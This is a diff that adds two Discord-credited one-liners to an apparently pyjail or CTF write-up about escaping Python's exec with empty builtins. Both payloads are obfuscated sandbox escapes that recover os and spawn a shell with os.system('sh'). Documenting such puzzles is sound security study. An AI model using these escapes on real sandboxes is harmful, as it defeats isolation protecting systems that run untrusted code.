@@ -95,3 +95,15 @@ exec(f, {'__builtins__': {}}, {'__builtins__': {}})
 ```
 
 The code matches our expectation.
+
+Also by @mji from Discord:
+
+```python
+b,*_=().__class__.__class__.__subclasses__(().__class__.__class__);_,_,_,_,_,_,__import__,_,_,_,_,_,_,_,chr,*_=b.register.__builtins__.values();__import__(chr(111)+chr(115)).system(chr(115)+chr(104))
+```
+
+Also by @Panicks28 from Discord:
+
+```python
+(d:=().__doc__,d:=().__dir__().__class__(d),s:=d.pop(19),d.__class__(().__class__.__mro__).pop(1).__subclasses__().pop(130).load_module(d.pop(33)+s).system(s+d.pop(54)))
+```
